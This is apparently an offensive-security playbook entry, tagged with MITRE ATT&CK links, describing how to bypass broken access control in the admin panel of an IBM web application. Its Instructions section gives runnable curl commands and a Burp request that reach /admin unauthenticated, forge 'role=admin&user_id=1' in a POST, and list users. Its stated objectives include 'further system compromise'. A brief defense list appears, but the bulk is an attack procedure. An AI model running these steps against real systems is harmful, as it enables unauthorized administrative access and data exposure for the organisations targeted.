---
id: proc-uuid-002
name: Bypass-Access-Control-in-Admin-Panel
tags:
  - broken-access-control
  - authorization-bypass
  - admin
  - web
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
  - '[[Defense Evasion]]'
commands:
  - '[[commands/curl-admin-bypass]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:30:18.674Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[Default Accounts]]'
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Defense Evasion]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Bypass-Access-Control-in-Admin-Panel

## Summary

This procedure exploits broken access controls in the admin panel of IBM's access control application, allowing unauthorized users to access and perform administrative functions without proper authentication or role checks.

## Description

Insufficient access controls in the admin panel enable attackers to directly navigate to or manipulate admin endpoints, potentially combined with prior SQL injection for privilege escalation. In the IBM context, this leads to unauthorized execution of admin operations like user management or system configuration changes. The target is a web-based panel, exploitable via direct URL access or parameter tampering, as detailed in the HackerOne report.

## Requirements

1. Access to the web application (no auth needed due to broken controls)
2. Proxy tool like Burp Suite for request manipulation
3. Understanding of HTTP methods and session handling

## Defense

Defensive measures and detection strategies:

- Enforce role-based access control (RBAC) with server-side validation on all admin endpoints
- Implement authentication checks and session management to prevent direct access
- Log and monitor access to admin paths, alerting on unauthenticated attempts

## Objectives

1. Gain entry to the admin panel without credentials
2. Execute unauthorized administrative actions
3. Leverage for further system compromise

## Instructions

### Step 1: Attempt Direct Admin Access

**Context**: Try accessing the admin panel URL directly without logging in to check if controls are enforced.

**Command** ([[commands/curl-admin-bypass]]):
```bash
curl -X GET "https://target.ibm-app.com/admin" -H "User-Agent: Mozilla/5.0" -v
```

> If successful, the response will return the admin page HTML or dashboard content instead of a 401/403 error.

### Step 2: Tamper with Parameters for Privilege Escalation

**Context**: If partial access, modify request parameters or headers to impersonate an admin role, such as forcing a user_id or role value.

**Command** ([[commands/curl-admin-bypass]]):
```bash
curl -X POST "https://target.ibm-app.com/admin/action" -d "role=admin&user_id=1" -H "Cookie: session=abc123" -v
```

> Look for successful action execution, like a confirmation message or altered data.

### Step 3: Verify Admin Operations

**Context**: Perform a test admin action, such as listing users, to confirm full access.

**Command** ([[tools/Burp-Suite]]):
Intercept and modify a request in Burp, then forward:
```http
POST /admin/users HTTP/1.1
Host: target.ibm-app.com
Content-Type: application/x-www-form-urlencoded

action=list
```

> Expected output: JSON or HTML listing admin-viewable data.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Defense Evasion]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques

- [[Default Accounts]]

## Commands Used

- [[commands/curl-admin-bypass]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- broken-access-control
- authorization-bypass
- admin
- web
